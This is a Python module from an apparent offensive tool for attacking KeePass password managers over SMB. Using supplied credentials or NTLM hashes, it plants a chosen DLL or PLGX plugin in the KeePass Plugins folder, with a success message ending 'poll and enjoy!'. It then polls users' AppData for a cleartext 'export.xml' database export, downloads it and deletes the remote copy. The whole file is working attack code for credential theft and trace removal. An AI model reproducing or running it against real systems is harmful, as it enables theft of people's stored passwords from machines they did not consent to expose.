import ntpath
import os
from io import BytesIO
from pathlib import Path
from time import sleep

from impacket.smbconnection import SessionError

from keepwn.utils.logging import print_error, print_info, print_success, print_warning, print_found_plugins, Loader, \
    format_path, display_smb_error
from keepwn.utils.parser import parse_mandatory_options, parse_remote_path
from keepwn.utils.smb import smb_connect


def get_plugin_folder_path(smb_connection, share, plugin_path):
    if plugin_path:
        if 'plugin' not in plugin_path.lower():
            print_warning("Specified path does not look like a plugin path, do you want to use it [y/n]")
            ans = input('> ')
            if ans.lower() not in ['y', 'yes', '']:
                exit(0)
    else:
        print_info("No path specified, searching in default locations..")
        plugin_path = '\\Program Files\\KeePass Password Safe 2\\Plugins\\'
    try:
        smb_connection.listPath(share, plugin_path)
    except SessionError as e:
        return None
    return plugin_path


def get_plugins(smb_connection, share, plugin_path):
    if not plugin_path.endswith('\\*'):
        plugin_path += '\\*'
    try:
        plugins = []
        for file in smb_connection.listPath(share, plugin_path):
            plugins.append(file.get_longname())
        plugins.remove('.')
        plugins.remove('..')
    except SessionError as e:
        print_error("Unable to find KeePass plugin folder")
        return None
    return plugins


def get_cached_plugins(smb_connection, share):
    cached_plugins = {}
    try:
        for file in smb_connection.listPath(share, '\\Users\\*'):
            if file.is_directory():
                try:
                    path = '\\Users\\{}\\AppData\\Local\\KeePass\\PluginCache'.format(file.get_longname())
                    smb_path = path + '\\*'
                    plugins = smb_connection.listPath(share, smb_path)
                    cached_plugins[path] = []
                    for plugin in plugins:
                        if plugin.get_longname() not in ['.', '..']:
                            cached_plugins[path].append(plugin.get_longname())
                except SessionError as e:
                    pass  # the file was not found
    except SessionError as e:
        pass  # the file was not found
    return cached_plugins


def check_plugin(options):
    targets, share, domain, user, password, lm_hash, nt_hash = parse_mandatory_options(options)
    target = targets[0]
    smb_connection, error = smb_connect(target, share, user, password, domain, lm_hash, nt_hash)

    if error or not smb_connection:
        display_smb_error(error, target, False)
        return

    if options.plugin_path:
        custom_plugin_path = parse_remote_path(options.plugin_path)
    else:
        custom_plugin_path = None

    plugin_folder_path = get_plugin_folder_path(smb_connection, share, custom_plugin_path)
    if not plugin_folder_path:
        print_error("Unable to find KeePass plugin folder")
        return

    plugins = get_plugins(smb_connection, share, plugin_folder_path)
    print_found_plugins(plugins, share, plugin_folder_path)
    cached_plugins = get_cached_plugins(smb_connection, share)

    for path in cached_plugins:
        print_found_plugins(cached_plugins[path], share, path)

def add_plugin(options):

    if options.plugin is None:
        print_error('Missing plugin file, specify one with --plugin')
        exit(1)

    if not os.path.exists(options.plugin):
        print_error('The specified plugin file does not exist')
        exit(1)

    if not (options.plugin.lower().endswith('dll') or options.plugin.lower().endswith('plgx')):
        print_warning("The specified file does not look like a plugin, do you want to use it anyway? [y/n]")
        ans = input('> ')
        if ans.lower() not in['y', 'yes', '']:
            exit(0)

    targets, share, domain, user, password, lm_hash, nt_hash = parse_mandatory_options(options)
    target = targets[0]
    smb_connection, error = smb_connect(target, share, user, password, domain, lm_hash, nt_hash)

    if error or not smb_connection:
        display_smb_error(error, target, False)
        return

    if options.plugin_path:
        custom_plugin_path = parse_remote_path(options.plugin_path)
    else:
        custom_plugin_path = None

    plugin_folder_path = get_plugin_folder_path(smb_connection, share, custom_plugin_path)
    if plugin_folder_path:
        print_info("Found KeePass Plugins directory {}".format(format_path('\\\\{}{}'.format(share, plugin_folder_path))))
    else:
        print_error("Unable to add plugin (folder does not exist?)")
        return

    plugin_file = Path(options.plugin).name

    found_plugin = False
    for plugin in get_plugins(smb_connection, share, plugin_folder_path):
        if plugin_file in plugin:
            found_plugin = True

    if found_plugin:
        print_warning("Plugin already added to KeePass Plugin directory, do you want to overwrite? [y/n]".format(plugin_file))
        ans = input('> ')
        if ans.lower() not in ['y', 'yes', '']:
            exit(0)

    fh = open(options.plugin, 'rb')
    try:
        smb_connection.putFile(share, ntpath.join(plugin_folder_path, plugin_file), fh.read)
    except Exception as error:
        str_error = str(error)
        if 'Errno' in str_error:
            print_error(str_error.split('] ')[-1].capitalize())
        elif 'STATUS_SHARING_VIOLATION' in str_error:
            print_error("Can't overwrite plugin while it is in use use by KeePass")
        elif 'SMB' in str_error:
            print_error(str_error.split('(')[0])
        else:
            print_error('Unkown error while connecting to target: {}'.format(str_error))
        exit(1)

    fh.close()

    found_plugin = False
    for plugin in get_plugins(smb_connection, share, plugin_folder_path):
        if plugin_file in plugin:
            found_plugin = True

    if found_plugin:
        print_success('Plugin successfully added to KeePass, wait for next restart, poll and enjoy!')
    else:
        print_error('Unknown error while adding plugin to target, the file may have been deleted by AV')
    return

def clean_plugin(options):
    if options.plugin is None:
        print_error('Missing plugin file, specify one with --plugin')
        exit(1)

    targets, share, domain, user, password, lm_hash, nt_hash = parse_mandatory_options(options)
    target = targets[0]
    smb_connection, error = smb_connect(target, share, user, password, domain, lm_hash, nt_hash)

    if error or not smb_connection:
        display_smb_error(error, target, False)
        return

    if options.plugin_path:
        custom_plugin_path = parse_remote_path(options.plugin_path)
    else:
        custom_plugin_path = None

    plugin_folder_path = get_plugin_folder_path(smb_connection, share, custom_plugin_path)
    if plugin_folder_path:
        print_info(
            "Found KeePass Plugins directory {}".format(format_path('\\\\{}{}'.format(share, plugin_folder_path))))
    else:
        return

    plugin_file = Path(options.plugin).name

    found_plugin = False
    for plugin in get_plugins(smb_connection, share, plugin_folder_path):
        if plugin_file in plugin:
            found_plugin = True

    if not found_plugin:
        print_warning("Plugin not found in KeePass Plugin directory, aborting deletion".format(plugin_file))
        exit(1)

    try:
        smb_connection.deleteFile(share, ntpath.join(plugin_folder_path, plugin_file))
    except Exception as error:
        str_error = str(error)
        if 'Errno' in str_error:
            print_error(str_error.split('] ')[-1].capitalize())
        elif 'STATUS_SHARING_VIOLATION' in str_error:
            print_error("Can't delete the plugin while KeePass is running")
        elif 'SMB' in str_error:
            print_error(str_error.split('(')[0])
        else:
            print_error('Unkown error while connecting to target: {}'.format(str_error))
        return

    found_plugin = False
    for plugin in get_plugins(smb_connection, share, plugin_folder_path):
        if plugin_file in plugin:
            found_plugin = True

    if found_plugin:
        print_error('Failed to delete plugin')
    else:
        print_success('Plugin successfully deleted')
    return

def poll_plugin(options):

    targets, share, domain, user, password, lm_hash, nt_hash = parse_mandatory_options(options)
    target = targets[0]
    smb_connection, error = smb_connect(target, share, user, password, domain, lm_hash, nt_hash)

    if error or not smb_connection:
        display_smb_error(error, target, False)
        return

    #TODO: refactor in function to avoid code duplication (single/multiple poll + trigger/plugin poll)
    if options.poll_path:
        poll_path = parse_remote_path(options.poll_path)
    else:
        poll_path = None

    export_path = None

    if options.single:
        try:
            if poll_path:
                try:
                    for file in smb_connection.listPath(share, poll_path):
                        if not file.is_directory():
                            export_path = poll_path
                            continue
                        else:
                            print_error("Found a directory, are you sure that you specified an export file path?")
                except SessionError as e:
                    pass
            else:
                for file in smb_connection.listPath(share, '\\Users\\*'):
                    if file.is_directory():
                        try:
                            path = '\\Users\\{}\\AppData\\Roaming\\export.xml'.format(file.get_longname())
                            for found_file in smb_connection.listPath(share, path):
                                export_path = path
                                continue
                        except SessionError as e:
                            pass  # the file was not found
        except SessionError as e:
            pass

        if not export_path:
            if poll_path:
                print_error("{} not found on tharget".format(format_path('\\\\' + share + poll_path)))
            else:
                print_error("%APPDATA%\export.xml not found on target".format(share))
            exit(0)

    else:
        try:
            with Loader("Polling for database export every 5 seconds.. press CTRL+C to abort", end="Polling for database export every 5 seconds.. press CTRL+C to abort. DONE"):
                while not export_path:
                    try:
                        if poll_path:
                            try:
                                for file in smb_connection.listPath(share, poll_path):
                                    if not file.is_directory():
                                        export_path = poll_path
                                        continue
                                    else:
                                        print()
                                        print_error("Found a directory, are you sure that you specified an export file path?")
                                        exit(1)
                            except SessionError as e:
                                pass  # the file was not found
                        else:
                            for file in smb_connection.listPath(share, '\\Users\\*'):
                                if file.is_directory():
                                    try:
                                        path = '\\Users\\{}\\AppData\\Roaming\\export.xml'.format(file.get_longname())
                                        for found_file in smb_connection.listPath(share, path):
                                            export_path = path
                                            continue
                                    except SessionError as e:
                                        pass  # the file was not found
                    except SessionError as e:
                        pass  # the file was not found
                    if not export_path:
                        sleep(5)
        except KeyboardInterrupt:
            exit(0)

    export_path_basename = ntpath.basename(export_path)
    print_success("Found cleartext export {}".format(format_path('\\\\{}\\{}'.format(share, export_path))))

    try:
        buffer = BytesIO()
        smb_connection.getFile(share, export_path, buffer.write)
        local_path = os.path.join(os.getcwd(), export_path_basename)
        # downloads the exported database
        with open(local_path, "wb") as f:
            f.write(buffer.getbuffer())

        smb_connection.deleteFile(share, export_path)
        relative_path = os.path.relpath(local_path, os.getcwd())
        print_success("Moved remote export to {}".format('.' + os.sep + relative_path))
    except:
        print_error("Unkown error while getting export.")
        exit(1)
